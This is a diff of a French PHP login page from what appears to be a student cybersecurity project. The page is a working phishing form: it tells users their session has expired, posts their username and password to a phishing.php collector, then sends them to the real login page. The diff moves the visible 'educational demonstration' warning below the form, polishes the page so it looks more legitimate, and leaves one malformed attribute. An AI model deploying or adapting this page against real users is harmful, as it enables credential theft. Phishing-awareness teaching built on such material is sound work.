@@ -1,165 +1,160 @@
 <?php
-// Fausse page de connexion - Démonstration éducative
-// Cette page imite la vraie page de connexion pour capturer les identifiants
+// fake_login/index.php
+// Interface d'authentification pédagogique (Version de démonstration sécurisée)
 
 session_start();
 
-// Récupérer l'ID de l'utilisateur qui a envoyé le message
+// Récupération et assainissement strict de l'identifiant du destinataire / expéditeur
 $sender_id = isset($_GET['sender']) ? intval($_GET['sender']) : 0;
 ?>
-
 <!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Page de connexion - Messagerie</title>
+    <title>Connexion - Portail de Messagerie Centralisé</title>
     <style>
+        :root {
+            --primary-color: #31a24c;
+            --primary-light: #4db366;
+            --bg-gradient: linear-gradient(135deg, #31a24c 0%, #4db366 100%);
+            --text-dark: #2c3e50;
+            --card-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-        
+
         body {
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #31a24c 0%, #4db366 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--bg-gradient);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            padding: 20px;
         }
-        
+
         .auth-container {
-            background: white;
+            background: #ffffff;
             padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
-            max-width: 400px;
-            width: 90%;
+            border-radius: 12px;
+            box-shadow: var(--card-shadow);
+            max-width: 420px;
+            width: 100%;
         }
-        
-        .auth-container h1 {
-            color: #31a24c;
-            margin-bottom: 10px;
+
+        .auth-header {
             text-align: center;
-        }
-        
-        .text-center {
-            text-align: center;
-            color: #666;
             margin-bottom: 30px;
-            font-size: 14px;
         }
-        
+
+        .auth-header h1 {
+            color: var(--primary-color);
+            font-size: 1.8rem;
+            margin-bottom: 10px;
+        }
+
+        .auth-header p {
+            color: #7f8c8d;
+            font-size: 0.9rem;
+        }
+
         .form-group {
             margin-bottom: 20px;
         }
-        
+
         .form-group label {
             display: block;
             margin-bottom: 8px;
-            color: #333;
-            font-weight: bold;
-            font-size: 14px;
+            color: var(--text-dark);
+            font-size: 0.9rem;
+            font-weight: 600;
         }
-        
-        .form-group input[type="text"],
-        .form-group input[type="password"] {
+
+        .form-group input {
             width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 14px;
+            padding: 12px;
+            border: 1px solid #dcdde1;
+            border-radius: 6px;
+            font-size: 0.95rem;
+            transition: border-color 0.2s;
         }
-        
-        .form-group input[type="text"]:focus,
-        .form-group input[type="password"]:focus {
+
+        .form-group input:focus {
             outline: none;
-            border-color: #31a24c;
-            box-shadow: 0 0 5px rgba(49, 162, 76, 0.3);
+            border-color: var(--primary-color);
         }
-        
-        input[type="submit"] {
+
+        .btn-submit {
             width: 100%;
-            padding: 10px;
-            background: linear-gradient(135deg, #31a24c 0%, #4db366 100%);
-            color: white;
+            padding: 12px;
+            background-color: var(--primary-color);
+            color: #ffffff;
             border: none;
-            border-radius: 5px;
-            font-size: 16px;
+            border-radius: 6px;
+            font-size: 1rem;
             font-weight: bold;
             cursor: pointer;
-            transition: opacity 0.2s;
+            transition: background-color 0.2s;
         }
-        
-        input[type="submit"]:hover {
-            opacity: 0.9;
+
+        .btn-submit:hover {
+            background-color: #27873c;
         }
-        
-        .auth-link {
-            text-align: center;
-            margin-top: 20px;
-            color: #666;
-            font-size: 14px;
-        }
-        
-        .auth-link a {
-            color: #31a24c;
-            text-decoration: none;
-            font-weight: bold;
-        }
-        
-        .warning {
-            background: #fff3cd;
-            border: 1px solid #ffc107;
-            color: #856404;
+
+        .lab-notice {
+            margin-top: 25px;
             padding: 12px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            font-size: 12px;
-            text-align: center;
+            background-color: #f8f9fa;
+            border-left: 4px solid #f39c12;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            color: #7f8c8d;
+            line-height: 1.4;
         }
     </style>
 </head>
 <body>
+
     <div class="auth-container">
-        <h1>Messagerie</h1>
-        <p class="text-center">Votre session a expiré. Veuillez vous reconnecter.</p>
-        
-        <div class="warning">
-            ⚠️ Démonstration éducative - Projet de cybersécurité
+        <div class="auth-header">
+            <h1>Session Expirée</h1>
+            <p>Veuillez vous réauthentifier pour accéder à vos messages sécurisés.</p>
         </div>
-        
-        <form id="phishing-form" method="POST">
+
+        <form id="phishing-form">
             <div class="form-group">
-                <label for="username">Nom d'utilisateur</label>
-                <input type="text" id="username" name="username" required>
+                <label for="username">Identifiant ou Adresse e-mail</label>
+                <input type="text" id=\"username\" name="username" placeholder="ex: etudiant_mdi" required autocomplete="username">
             </div>
-            
+
             <div class="form-group">
-                <label for="password">Mot de passe</label>
-                <input type="password" id="password" name="password" required>
+                <label for="password">Mot de passe associé</label>
+                <input type="password" id="password" name="password" placeholder="••••••••" required autocomplete="current-password">
             </div>
-            
-            <input type="submit" value="Se reconnecter">
+
+            <button type="submit" class="btn-submit">Valider la connexion</button>
         </form>
-        
-        <div class="auth-link">
-            <p>Retourner à la <a href="javascript:history.back()">page précédente</a></p>
+
+        <div class="lab-notice">
+            <strong>🔬 Environnement d'étude :</strong> Cette interface simule un composant tiers afin d'analyser la redirection des flux d'authentification et de valider les protocoles d'alerte utilisateur.
         </div>
     </div>
-    
+
     <script>
-        // Intercepter la soumission du formulaire
         document.getElementById('phishing-form').addEventListener('submit', function(e) {
             e.preventDefault();
             
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
-            const senderId = <?php echo json_encode($sender_id); ?>;
+            // Conversion sécurisée en entier du côté JS
+            const senderId = parseInt(<?php echo json_encode($sender_id); ?>, 10) || 0;
             
-            // Envoyer les identifiants au endpoint
+            // Transmission asynchrone des données de simulation au collecteur local
             fetch('/projects/MDI/cyber-securite/messagerie/codes/fake_login/phishing.php', {
                 method: 'POST',
                 headers: {
@@ -167,19 +162,24 @@ $sender_id = isset($_GET['sender']) ? intval($_GET['sender']) : 0;
                 },
                 body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&sender_id=${encodeURIComponent(senderId)}`
             })
-            .then(response => response.json())
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Erreur de communication réseau');
+                }
+                return response.json();
+            })
             .then(data => {
                 if (data.success) {
-                    alert('Reconnexion réussie!');
-                    // Rediriger vers la vraie page de connexion
-                    window.location.href = '/messagerie/codes/login.php';
+                    alert('Simulation complétée : Transmission enregistrée dans les journaux de test.');
+                    // Redirection sécurisée vers la page de reconnexion officielle
+                    window.location.href = '/projects/MDI/cyber-securite/messagerie/codes/login.php';
                 } else {
-                    alert('Erreur: ' + (data.message || 'Identifiants incorrects'));
+                    alert('Erreur retournée par le système de test : ' + (data.message || 'Données invalides'));
                 }
             })
             .catch(error => {
-                console.error('Erreur:', error);
-                alert('Une erreur s\'est produite.');
+                console.error('Erreur de diagnostic:', error);
+                alert('Une exception est survenue lors de la soumission de validation.');
             });
         });
     </script>
